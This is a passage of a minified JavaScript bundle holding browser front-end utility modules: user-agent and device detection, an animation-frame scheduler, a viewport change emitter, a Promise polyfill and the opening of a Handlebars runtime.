string")}}},{"@marcom/ac-dom-nodes/NODE_TYPES":416,"@marcom/ac-dom-nodes/isNodeType":418}],422:[function(e,t,n){"use strict";var i=function(){var e,t="";for(e=0;e<arguments.length;e++)e>0&&(t+=","),t+=arguments[e];return t};t.exports=function(e,t){t=t||i;var n=function(){var i=arguments,r=t.apply(this,i);return r in n.cache||(n.cache[r]=e.apply(this,i)),n.cache[r]};return n.cache={},n}},{}],423:[function(e,t,n){"use strict";t.exports=function(e){var t;return function(){return void 0===t&&(t=e.apply(this,arguments)),t}}},{}],424:[function(e,t,n){"use strict";var i=e("@marcom/ac-prefixer/getStyleValue"),r=e("@marcom/ac-prefixer/getStyleProperty"),o=e("@marcom/function-utils/memoize");function s(e,t){return void 0!==t?!!i(e,t):!!r(e)}t.exports=o(s),t.exports.original=s},{"@marcom/ac-prefixer/getStyleProperty":231,"@marcom/ac-prefixer/getStyleValue":232,"@marcom/function-utils/memoize":422}],425:[function(e,t,n){"use strict";t.exports={getWindow:function(){return window},getDocument:function(){return document},getNavigator:function(){return navigator}}},{}],426:[function(e,t,n){"use strict";var i=e("@marcom/useragent-detect").os,r=e("./touchAvailable").original,o=e("./helpers/globals"),s=e("@marcom/function-utils/once");function a(){var e=o.getWindow();return!r()&&!e.orientation||i.windows}t.exports=s(a),t.exports.original=a},{"./helpers/globals":425,"./touchAvailable":430,"@marcom/function-utils/once":423,"@marcom/useragent-detect":435}],427:[function(e,t,n){"use strict";var i=e("./isDesktop").original,r=e("./isTablet").original,o=e("@marcom/function-utils/once");function s(){return!i()&&!r()}t.exports=o(s),t.exports.original=s},{"./isDesktop":426,"./isTablet":429,"@marcom/function-utils/once":423}],428:[function(e,t,n){"use strict";var i=e("./helpers/globals");t.exports=function(){var e=i.getWindow();return"devicePixelRatio"in e&&e.devicePixelRatio>=1.5}},{"./helpers/globals":425}],429:[function(e,t,n){"use strict";var i=e("./isDesktop").original,r=e("./helpers/globals"),o=e("@marcom/function-utils/once");function s(){var e=r.getWindow(),t=e.screen.width;return e.orientation&&e.screen.height<t&&(t=e.screen.height),!i()&&t>=600}t.exports=o(s),t.exports.original=s},{"./helpers/globals":425,"./isDesktop":426,"@marcom/function-utils/once":423}],430:[function(e,t,n){"use strict";var i=e("./helpers/globals"),r=e("@marcom/function-utils/once");function o(){var e=i.getWindow(),t=i.getDocument(),n=i.getNavigator();return!!("ontouchstart"in e||e.DocumentTouch&&t instanceof e.DocumentTouch||n.maxTouchPoints>0||n.msMaxTouchPoints>0)}t.exports=r(o),t.exports.original=o},{"./helpers/globals":425,"@marcom/function-utils/once":423}],431:[function(e,t,n){"use strict";t.exports=function(e,t){var n;function i(){var i=arguments,r=function(){n=null,e.apply(this,i)}.bind(this);clearTimeout(n),n=setTimeout(r,t)}return i.cancel=function(){clearTimeout(n)},i}},{}],432:[function(e,t,n){"use strict";t.exports={browser:{safari:!1,chrome:!1,firefox:!1,ie:!1,opera:!1,android:!1,edge:!1,edgeChromium:!1,samsung:!1,version:{string:"",major:0,minor:0,patch:0,documentMode:!1}},os:{osx:!1,ios:!1,android:!1,windows:!1,linux:!1,fireos:!1,chromeos:!1,version:{string:"",major:0,minor:0,patch:0}}}},{}],433:[function(e,t,n){"use strict";t.exports={browser:[{name:"edge",userAgent:"Edge",version:["rv","Edge"],test:function(e){return e.ua.indexOf("Edge")>-1||"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"===e.ua}},{name:"edgeChromium",userAgent:"Edge",version:["rv","Edg"],test:function(e){return e.ua.indexOf("Edg")>-1&&-1===e.ua.indexOf("Edge")}},{name:"chrome",userAgent:"Chrome"},{name:"firefox",test:function(e){return e.ua.indexOf("Firefox")>-1&&-1===e.ua.indexOf("Opera")},version:"Firefox"},{name:"android",userAgent:"Android"},{name:"safari",test:function(e){return e.ua.indexOf("Safari")>-1&&e.vendor.indexOf("Apple")>-1},version:"Version"},{name:"ie",test:function(e){return e.ua.indexOf("IE")>-1||e.ua.indexOf("Trident")>-1},version:["MSIE","rv"],parseDocumentMode:function(){var e=!1;return document.documentMode&&(e=parseInt(document.documentMode,10)),e}},{name:"opera",userAgent:"Opera",version:["Version","Opera"]},{name:"samsung",userAgent:"SamsungBrowser"}],os:[{name:"windows",test:function(e){return e.ua.indexOf("Windows")>-1},version:"Windows NT"},{name:"osx",userAgent:"Mac",test:function(e){return e.ua.indexOf("Macintosh")>-1}},{name:"ios",test:function(e){return e.ua.indexOf("iPhone")>-1||e.ua.indexOf("iPad")>-1},version:["iPhone OS","CPU OS"]},{name:"linux",userAgent:"Linux",test:function(e){return(e.ua.indexOf("Linux")>-1||e.platform.indexOf("Linux")>-1)&&-1===e.ua.indexOf("Android")}},{name:"fireos",test:function(e){return e.ua.indexOf("Firefox")>-1&&e.ua.indexOf("Mobile")>-1},version:"rv"},{name:"android",userAgent:"Android",test:function(e){return e.ua.indexOf("Android")>-1}},{name:"chromeos",userAgent:"CrOS"}]}},{}],434:[function(e,t,n){"use strict";var i=e("./defaults"),r=e("./dictionary");function o(e,t){if("function"==typeof e.parseVersion)return e.parseVersion(t);var n,i=e.version||e.userAgent;"string"==typeof i&&(i=[i]);for(var r,o=i.length,s=0;s<o;s++)if((r=t.match((n=i[s],new RegExp(n+"[a-zA-Z\\s/:]+([0-9_.]+)","i"))))&&r.length>1)return r[1].replace(/_/g,".");return!1}function s(e,t,n){for(var i,r,s=e.length,a=0;a<s;a++)if("function"==typeof e[a].test?!0===e[a].test(n)&&(i=e[a].name):n.ua.indexOf(e[a].userAgent)>-1&&(i=e[a].name),i){if(t[i]=!0,"string"==typeof(r=o(e[a],n.ua))){var c=r.split(".");t.version.string=r,c&&c.length>0&&(t.version.major=parseInt(c[0]||0),t.version.minor=parseInt(c[1]||0),t.version.patch=parseInt(c[2]||0))}else"edge"===i&&(t.version.string="12.0.0",t.version.major="12",t.version.minor="0",t.version.patch="0");return"function"==typeof e[a].parseDocumentMode&&(t.version.documentMode=e[a].parseDocumentMode()),t}return t}t.exports=function(e){var t={};return t.browser=s(r.browser,i.browser,e),t.os=s(r.os,i.os,e),t}},{"./defaults":432,"./dictionary":433}],435:[function(e,t,n){"use strict";var i={ua:window.navigator.userAgent,platform:window.navigator.platform,vendor:window.navigator.vendor};t.exports=e("./parseUserAgent")(i)},{"./parseUserAgent":434}],436:[function(e,t,n){t.exports={majorVersionNumber:"3.x"}},{}],437:[function(e,t,n){"use strict";var i,r=e("@marcom/ac-event-emitter-micro").EventEmitterMicro,o=e("./sharedRAFExecutorInstance"),s=e("./sharedRAFEmitterIDGeneratorInstance");function a(e){e=e||{},r.call(this),this.id=s.getNewID(),this.executor=e.executor||o,this._reset(),this._willRun=!1,this._didDestroy=!1}(i=a.prototype=Object.create(r.prototype)).run=function(){return this._willRun||(this._willRun=!0),this._subscribe()},i.cancel=function(){this._unsubscribe(),this._willRun&&(this._willRun=!1),this._reset()},i.destroy=function(){var e=this.willRun();return this.cancel(),this.executor=null,r.prototype.destroy.call(this),this._didDestroy=!0,e},i.willRun=function(){return this._willRun},i.isRunning=function(){return this._isRunning},i._subscribe=function(){return this.executor.subscribe(this)},i._unsubscribe=function(){return this.executor.unsubscribe(this)},i._onAnimationFrameStart=function(e){this._isRunning=!0,this._willRun=!1,this._didEmitFrameData||(this._didEmitFrameData=!0,this.trigger("start",e))},i._onAnimationFrameEnd=function(e){this._willRun||(this.trigger("stop",e),this._reset())},i._reset=function(){this._didEmitFrameData=!1,this._isRunning=!1},t.exports=a},{"./sharedRAFEmitterIDGeneratorInstance":442,"./sharedRAFExecutorInstance":443,"@marcom/ac-event-emitter-micro":122}],438:[function(e,t,n){"use strict";var i,r=e("@marcom/ac-event-emitter-micro/EventEmitterMicro");function o(e){e=e||{},this._reset(),this.updatePhases(),this.eventEmitter=new r,this._willRun=!1,this._totalSubscribeCount=-1,this._requestAnimationFrame=window.requestAnimationFrame,this._cancelAnimationFrame=window.cancelAnimationFrame,this._boundOnAnimationFrame=this._onAnimationFrame.bind(this),this._boundOnExternalAnimationFrame=this._onExternalAnimationFrame.bind(this)}(i=o.prototype).frameRequestedPhase="requested",i.startPhase="start",i.runPhases=["update","external","draw"],i.endPhase="end",i.disabledPhase="disabled",i.beforePhaseEventPrefix="before:",i.afterPhaseEventPrefix="after:",i.subscribe=function(e,t){return this._totalSubscribeCount++,this._nextFrameSubscribers[e.id]||(t?this._nextFrameSubscribersOrder.unshift(e.id):this._nextFrameSubscribersOrder.push(e.id),this._nextFrameSubscribers[e.id]=e,this._nextFrameSubscriberArrayLength++,this._nextFrameSubscriberCount++,this._run()),this._totalSubscribeCount},i.subscribeImmediate=function(e,t){return this._totalSubscribeCount++,this._subscribers[e.id]||(t?this._subscribersOrder.splice(this._currentSubscriberIndex+1,0,e.id):this._subscribersOrder.unshift(e.id),this._subscribers[e.id]=e,this._subscriberArrayLength++,this._subscriberCount++),this._totalSubscribeCount},i.unsubscribe=function(e){return!!this._nextFrameSubscribers[e.id]&&(this._nextFrameSubscribers[e.id]=null,this._nextFrameSubscriberCount--,0===this._nextFrameSubscriberCount&&this._cancel(),!0)},i.getSubscribeID=function(){return this._totalSubscribeCount+=1},i.destroy=function(){var e=this._cancel();return this.eventEmitter.destroy(),this.eventEmitter=null,this.phases=null,this._subscribers=null,this._subscribersOrder=null,this._nextFrameSubscribers=null,this._nextFrameSubscribersOrder=null,this._rafData=null,this._boundOnAnimationFrame=null,this._onExternalAnimationFrame=null,e},i.useExternalAnimationFrame=function(e){if("boolean"==typeof e){var t=this._isUsingExternalAnimationFrame;return e&&this._animationFrame&&(this._cancelAnimationFrame.call(window,this._animationFrame),this._animationFrame=null),!this._willRun||e||this._animationFrame||(this._animationFrame=this._requestAnimationFrame.call(window,this._boundOnAnimationFrame)),this._isUsingExternalAnimationFrame=e,e?this._boundOnExternalAnimationFrame:t||!1}},i.updatePhases=function(){this.phases||(this.phases=[]),this.phases.length=0,this.phases.push(this.frameRequestedPhase),this.phases.push(this.startPhase),Array.prototype.push.apply(this.phases,this.runPhases),this.phases.push(this.endPhase),this._runPhasesLength=this.runPhases.length,this._phasesLength=this.phases.length},i._run=function(){if(!this._willRun)return this._willRun=!0,0===this.lastFrameTime&&(this.lastFrameTime=performance.now()),this._animationFrameActive=!0,this._isUsingExternalAnimationFrame||(this._animationFrame=this._requestAnimationFrame.call(window,this._boundOnAnimationFrame)),this.phase===this.disabledPhase&&(this.phaseIndex=0,this.phase=this.phases[this.phaseIndex]),!0},i._cancel=function(){var e=!1;return this._animationFrameActive&&(this._animationFrame&&(this._cancelAnimationFrame.call(window,this._animationFrame),this._animationFrame=null),this._animationFrameActive=!1,this._willRun=!1,e=!0),this._isRunning||this._reset(),e},i._onAnimationFrame=function(e){for(this._subscribers=this._nextFrameSubscribers,this._subscribersOrder=this._nextFrameSubscribersOrder,this._subscriberArrayLength=this._nextFrameSubscriberArrayLength,this._subscriberCount=this._nextFrameSubscriberCount,this._nextFrameSubscribers={},this._nextFrameSubscribersOrder=[],this._nextFrameSubscriberArrayLength=0,this._nextFrameSubscriberCount=0,this.phaseIndex=0,this.phase=this.phases[this.phaseIndex],this._isRunning=!0,this._willRun=!1,this._didRequestNextRAF=!1,this._rafData.delta=e-this.lastFrameTime,this.lastFrameTime=e,this._rafData.fps=0,this._rafData.delta>=1e3&&(this._rafData.delta=0),0!==this._rafData.delta&&(this._rafData.fps=1e3/this._rafData.delta),this._rafData.time=e,this._rafData.naturalFps=this._rafData.fps,this._rafData.timeNow=Date.now(),this.phaseIndex++,this.phase=this.phases[this.phaseIndex],this.eventEmitter.trigger(this.beforePhaseEventPrefix+this.phase),this._currentSubscriberIndex=0;this._currentSubscriberIndex<this._subscriberArrayLength;this._currentSubscriberIndex++)null!==this._subscribers[this._subscribersOrder[this._currentSubscriberIndex]]&&!1===this._subscribers[this._subscribersOrder[this._currentSubscriberIndex]]._didDestroy&&this._subscribers[this._subscribersOrder[this._currentSubscriberIndex]]._onAnimationFrameStart(this._rafData);for(this.eventEmitter.trigger(this.afterPhaseEventPrefix+this.phase),this._runPhaseIndex=0;this._runPhaseIndex<this._runPhasesLength;this._runPhaseIndex++){for(this.phaseIndex++,this.phase=this.phases[this.phaseIndex],this.eventEmitter.trigger(this.beforePhaseEventPrefix+this.phase),this._currentSubscriberIndex=0;this._currentSubscriberIndex<this._subscriberArrayLength;this._currentSubscriberIndex++)null!==this._subscribers[this._subscribersOrder[this._currentSubscriberIndex]]&&!1===this._subscribers[this._subscribersOrder[this._currentSubscriberIndex]]._didDestroy&&this._subscribers[this._subscribersOrder[this._currentSubscriberIndex]].trigger(this.phase,this._rafData);this.eventEmitter.trigger(this.afterPhaseEventPrefix+this.phase)}for(this.phaseIndex++,this.phase=this.phases[this.phaseIndex],this.eventEmitter.trigger(this.beforePhaseEventPrefix+this.phase),this._currentSubscriberIndex=0;this._currentSubscriberIndex<this._subscriberArrayLength;this._currentSubscriberIndex++)null!==this._subscribers[this._subscribersOrder[this._currentSubscriberIndex]]&&!1===this._subscribers[this._subscribersOrder[this._currentSubscriberIndex]]._didDestroy&&this._subscribers[this._subscribersOrder[this._currentSubscriberIndex]]._onAnimationFrameEnd(this._rafData);this.eventEmitter.trigger(this.afterPhaseEventPrefix+this.phase),this._willRun?(this.phaseIndex=0,this.phaseIndex=this.phases[this.phaseIndex]):this._reset()},i._onExternalAnimationFrame=function(e){this._isUsingExternalAnimationFrame&&this._onAnimationFrame(e)},i._reset=function(){this._rafData||(this._rafData={}),this._rafData.time=0,this._rafData.delta=0,this._rafData.fps=0,this._rafData.naturalFps=0,this._rafData.timeNow=0,this._subscribers={},this._subscribersOrder=[],this._currentSubscriberIndex=-1,this._subscriberArrayLength=0,this._subscriberCount=0,this._nextFrameSubscribers={},this._nextFrameSubscribersOrder=[],this._nextFrameSubscriberArrayLength=0,this._nextFrameSubscriberCount=0,this._didEmitFrameData=!1,this._animationFrame=null,this._animationFrameActive=!1,this._isRunning=!1,this._shouldReset=!1,this.lastFrameTime=0,this._runPhaseIndex=-1,this.phaseIndex=-1,this.phase=this.disabledPhase},t.exports=o},{"@marcom/ac-event-emitter-micro/EventEmitterMicro":123}],439:[function(e,t,n){"use strict";var i=e("./SingleCallRAFEmitter"),r=function(e){this.phase=e,this.rafEmitter=new i,this._cachePhaseIndex(),this.requestAnimationFrame=this.requestAnimationFrame.bind(this),this.cancelAnimationFrame=this.cancelAnimationFrame.bind(this),this._onBeforeRAFExecutorStart=this._onBeforeRAFExecutorStart.bind(this),this._onBeforeRAFExecutorPhase=this._onBeforeRAFExecutorPhase.bind(this),this._onAfterRAFExecutorPhase=this._onAfterRAFExecutorPhase.bind(this),this.rafEmitter.on(this.phase,this._onRAFExecuted.bind(this)),this.rafEmitter.executor.eventEmitter.on("before:start",this._onBeforeRAFExecutorStart),this.rafEmitter.executor.eventEmitter.on("before:"+this.phase,this._onBeforeRAFExecutorPhase),this.rafEmitter.executor.eventEmitter.on("after:"+this.phase,this._onAfterRAFExecutorPhase),this._frameCallbacks=[],this._currentFrameCallbacks=[],this._nextFrameCallbacks=[],this._phaseActive=!1,this._currentFrameID=-1,this._cancelFrameIdx=-1,this._frameCallbackLength=0,this._currentFrameCallbacksLength=0,this._nextFrameCallbacksLength=0,this._frameCallbackIteration=0},o=r.prototype;o.requestAnimationFrame=function(e,t){return!0===t&&this.rafEmitter.executor.phaseIndex>0&&this.rafEmitter.executor.phaseIndex<=this.phaseIndex?this._phaseActive?(this._currentFrameID=this.rafEmitter.executor.subscribeImmediate(this.rafEmitter,!0),this._frameCallbacks.push(this._currentFrameID,e),this._frameCallbackLength+=2):(this._currentFrameID=this.rafEmitter.executor.subscribeImmediate(this.rafEmitter,!1),this._currentFrameCallbacks.push(this._currentFrameID,e),this._currentFrameCallbacksLength+=2):(this._currentFrameID=this.rafEmitter.run(),this._nextFrameCallbacks.push(this._currentFrameID,e),this._nextFrameCallbacksLength+=2),this._currentFrameID},o.cancelAnimationFrame=function(e){this._cancelFrameIdx=this._nextFrameCallbacks.indexOf(e),this._cancelFrameIdx>-1?this._cancelNextAnimationFrame():(this._cancelFrameIdx=this._currentFrameCallbacks.indexOf(e),this._cancelFrameIdx>-1?this._cancelCurrentAnimationFrame():(this._cancelFrameIdx=this._frameCallbacks.indexOf(e),this._cancelFrameIdx>-1&&this._cancelRunningAnimationFrame()))},o._onRAFExecuted=function(e){for(this._frameCallbackIteration=0;this._frameCallbackIteration<this._frameCallbackLength;this._frameCallbackIteration+=2)this._frameCallbacks[this._frameCallbackIteration+1](e.time,e);this._frameCallbacks.length=0,this._frameCallbackLength=0},o._onBeforeRAFExecutorStart=function(){Array.prototype.push.apply(this._currentFrameCallbacks,this._nextFrameCallbacks.splice(0,this._nextFrameCallbacksLength)),this._currentFrameCallbacksLength=this._nextFrameCallbacksLength,this._nextFrameCallbacks.length=0,this._nextFrameCallbacksLength=0},o._onBeforeRAFExecutorPhase=function(){this._phaseActive=!0,Array.prototype.push.apply(this._frameCallbacks,this._currentFrameCallbacks.splice(0,this._currentFrameCallbacksLength)),this._frameCallbackLength=this._currentFrameCallbacksLength,this._currentFrameCallbacks.length=0,this._currentFrameCallbacksLength=0},o._onAfterRAFExecutorPhase=function(){this._phaseActive=!1},o._cachePhaseIndex=function(){this.phaseIndex=this.rafEmitter.executor.phases.indexOf(this.phase)},o._cancelRunningAnimationFrame=function(){this._frameCallbacks.splice(this._cancelFrameIdx,2),this._frameCallbackLength-=2},o._cancelCurrentAnimationFrame=function(){this._currentFrameCallbacks.splice(this._cancelFrameIdx,2),this._currentFrameCallbacksLength-=2},o._cancelNextAnimationFrame=function(){this._nextFrameCallbacks.splice(this._cancelFrameIdx,2),this._nextFrameCallbacksLength-=2,0===this._nextFrameCallbacksLength&&this.rafEmitter.cancel()},t.exports=r},{"./SingleCallRAFEmitter":441}],440:[function(e,t,n){"use strict";var i=e("./RAFInterface"),r=function(){this.events={}},o=r.prototype;o.requestAnimationFrame=function(e){return this.events[e]||(this.events[e]=new i(e)),this.events[e].requestAnimationFrame},o.cancelAnimationFrame=function(e){return this.events[e]||(this.events[e]=new i(e)),this.events[e].cancelAnimationFrame},t.exports=new r},{"./RAFInterface":439}],441:[function(e,t,n){"use strict";var i=e("./RAFEmitter"),r=function(e){i.call(this,e)};(r.prototype=Object.create(i.prototype))._subscribe=function(){return this.executor.subscribe(this,!0)},t.exports=r},{"./RAFEmitter":437}],442:[function(e,t,n){"use strict";var i=e("@marcom/ac-shared-instance").SharedInstance,r=e("../.release-info.js").majorVersionNumber,o=function(){this._currentID=0};o.prototype.getNewID=function(){return this._currentID++,"raf:"+this._currentID},t.exports=i.share("@marcom/ac-raf-emitter/sharedRAFEmitterIDGeneratorInstance",r,o)},{"../.release-info.js":436,"@marcom/ac-shared-instance":261}],443:[function(e,t,n){"use strict";var i=e("@marcom/ac-shared-instance").SharedInstance,r=e("../.release-info.js").majorVersionNumber,o=e("./RAFExecutor");t.exports=i.share("@marcom/ac-raf-emitter/sharedRAFExecutorInstance",r,o)},{"../.release-info.js":436,"./RAFExecutor":438,"@marcom/ac-shared-instance":261}],444:[function(e,t,n){"use strict";var i=e("./RAFInterfaceController");t.exports=i.requestAnimationFrame("update")},{"./RAFInterfaceController":440}],445:[function(e,t,n){"use strict";var i=e("@marcom/ac-event-emitter-micro").EventEmitterMicro,r=e("@marcom/ac-raf-emitter/update"),o={removeNamespace:!0},s="data-viewport-emitter-dispatch",a="data-viewport-emitter-state",c="change:any";function l(e,t){i.call(this),this._id=e||"viewport-emitter",this._options=Object.assign({},o,t),this._allowDOMEventDispatch=!1,this._allowElementStateData=!1,this._options.removeNamespace="boolean"!=typeof this._options.removeNamespace||this._options.removeNamespace,this._el=this._initViewportEl(this._id),this._resizing=!1,this._mediaQueryLists={resolution:{retina:window.matchMedia("only screen and (-webkit-min-device-pixel-ratio: 1.5), screen and (min-resolution: 1.5dppx), screen and (min-resolution: 144dpi)")},orientation:{portrait:window.matchMedia("only screen and (orientation: portrait)"),landscape:window.matchMedia("only screen and (orientation: landscape)")}},this._viewport=this._getViewport(this._options.removeNamespace),this._retina=this._getRetina(this._mediaQueryLists.resolution.retina),this._orientation=this._initOrientation(),this._addListeners(),this._updateElementStateData()}Object.defineProperty(l,"DOM_DISPATCH_ATTRIBUTE",{get:function(){return s}}),Object.defineProperty(l,"DOM_STATE_ATTRIBUTE",{get:function(){return a}});var u=l.prototype=Object.create(i.prototype);Object.defineProperty(u,"id",{get:function(){return this._id}}),Object.defineProperty(u,"element",{get:function(){return this._el}}),Object.defineProperty(u,"mediaQueryLists",{get:function(){return this._mediaQueryLists}}),Object.defineProperty(u,"viewport",{get:function(){return this._viewport}}),Object.defineProperty(u,"retina",{get:function(){return this._retina}}),Object.defineProperty(u,"orientation",{get:function(){return this._orientation}}),Object.defineProperty(u,"hasDomDispatch",{get:function(){return this._allowDOMEventDispatch}}),u.destroy=function(){for(var e in this._removeListeners(),this._options)this._options[e]=null;for(var t in this._mediaQueryLists){var n=this._mediaQueryLists[t];for(var r in n)n[r]=null}this._id=null,this._el=null,this._viewport=null,this._retina=null,this._orientation=null,i.prototype.destroy.call(this)},u._initViewportEl=function(e){var t=document.getElementById(e);return t||((t=document.createElement("div")).id=e,t=document.body.appendChild(t)),t.hasAttribute(s)||(t.setAttribute(s,""),this._allowDOMEventDispatch=!0),t.hasAttribute(a)||(this._allowElementStateData=!0),t},u._dispatch=function(e,t){var n={viewport:this._viewport,orientation:this._orientation,retina:this._retina};if(this._allowDOMEventDispatch){var i=new CustomEvent(e,{detail:t}),r=new CustomEvent(c,{detail:n});this._el.dispatchEvent(i),this._el.dispatchEvent(r)}this.trigger(e,t),this.trigger(c,n)},u._addListeners=function(){this._onOrientationChange=this._onOrientationChange.bind(this),this._onRetinaChange=this._onRetinaChange.bind(this),this._onViewportChange=this._onViewportChange.bind(this),this._onViewportChangeUpdate=this._onViewportChangeUpdate.bind(this),this._mediaQueryLists.orientation.portrait.addListener(this._onOrientationChange),this._mediaQueryLists.orientation.landscape.addListener(this._onOrientationChange),this._mediaQueryLists.resolution.retina.addListener(this._onRetinaChange),window.addEventListener("resize",this._onViewportChange)},u._removeListeners=function(){this._mediaQueryLists.orientation.portrait.removeListener(this._onOrientationChange),this._mediaQueryLists.orientation.landscape.removeListener(this._onOrientationChange),this._mediaQueryLists.resolution.retina.removeListener(this._onRetinaChange),window.removeEventListener("resize",this._onViewportChange)},u._updateElementStateData=function(){if(this._allowElementStateData){var e=JSON.stringify({viewport:this._viewport,orientation:this._orientation,retina:this._retina});this._el.setAttribute(a,e)}},u._getViewport=function(e){var t=window.getComputedStyle(this._el,"::before").content;return t?(t=t.replace(/["']/g,""),e?t.split(":").pop():t):null},u._getRetina=function(e){return e.matches},u._getOrientation=function(e){var t=this._orientation;return e.matches?e.media.match(/portrait|landscape/)[0]:t},u._initOrientation=function(){return this._getOrientation(this._mediaQueryLists.orientation.portrait)||this._getOrientation(this._mediaQueryLists.orientation.landscape)},u._onViewportChange=function(){this._resizing||(this._resizing=!0,r(this._onViewportChangeUpdate))},u._onViewportChangeUpdate=function(){var e=this._viewport;if(this._viewport=this._getViewport(this._options.removeNamespace),e!==this._viewport){var t={from:e,to:this._viewport};this._updateElementStateData(),this._dispatch("change:viewport",t)}this._resizing=!1},u._onRetinaChange=function(e){var t=this._retina;if(this._retina=this._getRetina(e),t!==this._retina){var n={from:t,to:this._retina};this._updateElementStateData(),this._dispatch("change:retina",n)}},u._onOrientationChange=function(e){var t=this._orientation;if(this._orientation=this._getOrientation(e),t!==this._orientation){var n={from:t,to:this._orientation};this._updateElementStateData(),this._dispatch("change:orientation",n)}},t.exports=l},{"@marcom/ac-event-emitter-micro":122,"@marcom/ac-raf-emitter/update":444}],446:[function(e,t,n){arguments[4][124][0].apply(n,arguments)},{"./ac-event-emitter/EventEmitter":447,dup:124}],447:[function(e,t,n){arguments[4][125][0].apply(n,arguments)},{dup:125}],448:[function(e,t,n){"use strict";var i=e("./promise/promise").Promise,r=e("./promise/polyfill").polyfill;n.Promise=i,n.polyfill=r},{"./promise/polyfill":452,"./promise/promise":453}],449:[function(e,t,n){"use strict";var i=e("./utils").isArray,r=e("./utils").isFunction;n.all=function(e){if(!i(e))throw new TypeError("You must pass an array to all.");return new this((function(t,n){var i,o=[],s=e.length;function a(e){return function(t){c(e,t)}}function c(e,n){o[e]=n,0==--s&&t(o)}0===s&&t([]);for(var l=0;l<e.length;l++)(i=e[l])&&r(i.then)?i.then(a(l),n):c(l,i)}))}},{"./utils":457}],450:[function(e,t,n){(function(e,t){(function(){"use strict";var i,r,o,s,a="undefined"!=typeof window?window:{},c=a.MutationObserver||a.WebKitMutationObserver,l=void 0!==t?t:void 0===this?window:this,u=[];function h(){for(var e=0;e<u.length;e++){var t=u[e];(0,t[0])(t[1])}u=[]}void 0!==e&&"[object process]"==={}.toString.call(e)?i=function(){e.nextTick(h)}:c?(r=0,o=new c(h),s=document.createTextNode(""),o.observe(s,{characterData:!0}),i=function(){s.data=r=++r%2}):i=function(){l.setTimeout(h,1)},n.asap=function(e,t){1===u.push([e,t])&&i()}}).call(this)}).call(this,e("_process"),"undefined"!=typeof global?global:"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{_process:482}],451:[function(e,t,n){"use strict";var i={instrument:!1};n.config=i,n.configure=function(e,t){if(2!==arguments.length)return i[e];i[e]=t}},{}],452:[function(e,t,n){(function(t){(function(){"use strict";var i=e("./promise").Promise,r=e("./utils").isFunction;n.polyfill=function(){var e,n;"Promise"in(e=void 0!==t?t:"undefined"!=typeof window&&window.document?window:self)&&"resolve"in e.Promise&&"reject"in e.Promise&&"all"in e.Promise&&"race"in e.Promise&&(new e.Promise((function(e){n=e})),r(n))||(e.Promise=i)}}).call(this)}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{"./promise":453,"./utils":457}],453:[function(e,t,n){"use strict";var i=e("./config").config,r=(e("./config").configure,e("./utils").objectOrFunction),o=e("./utils").isFunction,s=(e("./utils").now,e("./all").all),a=e("./race").race,c=e("./resolve").resolve,l=e("./reject").reject,u=e("./asap").asap;function h(e){if(!o(e))throw new TypeError("You must pass a resolver function as the first argument to the promise constructor");if(!(this instanceof h))throw new TypeError("Failed to construct 'Promise': Please use the 'new' operator, this object constructor cannot be called as a function.");this._subscribers=[],function(e,t){function n(e){w(t,e)}try{e((function(e){y(t,e)}),n)}catch(e){n(e)}}(e,this)}function d(e,t,n,i){var r,s,a,c,l=o(n);if(l)try{r=n(i),a=!0}catch(e){c=!0,s=e}else r=i,a=!0;g(t,r)||(l&&a?y(t,r):c?w(t,s):e===f?y(t,r):e===m&&w(t,r))}i.async=u;var p=void 0,f=1,m=2;function _(e,t,n,i){var r=e._subscribers,o=r.length;r[o]=t,r[o+f]=n,r[o+m]=i}function v(e,t){for(var n=e._subscribers,i=e._detail,r=0;r<n.length;r+=3)d(t,n[r],n[r+t],i);e._subscribers=null}function g(e,t){var n,i=null;try{if(e===t)throw new TypeError("A promises callback cannot return that same promise.");if(r(t)&&(i=t.then,o(i)))return i.call(t,(function(i){if(n)return!0;n=!0,t!==i?y(e,i):b(e,i)}),(function(t){if(n)return!0;n=!0,w(e,t)})),!0}catch(t){return n||w(e,t),!0}return!1}function y(e,t){e===t?b(e,t):g(e,t)||b(e,t)}function b(e,t){e._state===p&&(e._state=0,e._detail=t,i.async(E,e))}function w(e,t){e._state===p&&(e._state=0,e._detail=t,i.async(k,e))}function E(e){v(e,e._state=f)}function k(e){v(e,e._state=m)}h.prototype={constructor:h,_state:void 0,_detail:void 0,_subscribers:void 0,then:function(e,t){var n=this,r=new this.constructor((function(){}));if(this._state){var o=arguments;i.async((function(){d(n._state,r,o[n._state-1],n._detail)}))}else _(this,r,e,t);return r},catch:function(e){return this.then(null,e)}},h.all=s,h.race=a,h.resolve=c,h.reject=l,n.Promise=h},{"./all":449,"./asap":450,"./config":451,"./race":454,"./reject":455,"./resolve":456,"./utils":457}],454:[function(e,t,n){"use strict";var i=e("./utils").isArray;n.race=function(e){if(!i(e))throw new TypeError("You must pass an array to race.");return new this((function(t,n){for(var i,r=0;r<e.length;r++)(i=e[r])&&"function"==typeof i.then?i.then(t,n):t(i)}))}},{"./utils":457}],455:[function(e,t,n){"use strict";n.reject=function(e){return new this((function(t,n){n(e)}))}},{}],456:[function(e,t,n){"use strict";n.resolve=function(e){return e&&"object"==typeof e&&e.constructor===this?e:new this((function(t){t(e)}))}},{}],457:[function(e,t,n){"use strict";function i(e){return"function"==typeof e}var r=Date.now||function(){return(new Date).getTime()};n.objectOrFunction=function(e){return i(e)||"object"==typeof e&&null!==e},n.isFunction=i,n.isArray=function(e){return"[object Array]"===Object.prototype.toString.call(e)},n.now=r},{}],458:[function(e,t,n){"use strict";function i(e){return e&&e.__esModule?e:{default:e}}function r(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var n in e)Object.prototype.hasOwnProperty.call(e,n)&&(t[n]=e[n]);return t.default=e,t}n.__esModule=!0;var o=r(e("./handlebars/base")),s=i(e("./handlebars/safe-string")),a=i(e("./handlebars/exception")),c=r(e("./handlebars/utils")),l=r(e("./handlebars/runtime")),u=i(e("./handlebars/no-conflict"));function h(){var e=new o.HandlebarsEnvironment;return c.extend(e,o),e.SafeString=s.default,e.Exception=a.default,e.Utils=c,e.escapeExpression=c.escapeExpression,e.VM=l,e.template=function(t){return l.template(t,e)},e}var d=h();d.create=h,u.default(d),d.default=d,n.default=d,t.exports=n.default},{"./handlebars/base":459,"./handlebars/exception":462,"./handlebars/no-conflict":472,"./handlebars/runtime":473,"./handlebars/safe-string":474,"./handlebars/utils":475}],459:[function(e,t,n){"use strict";function 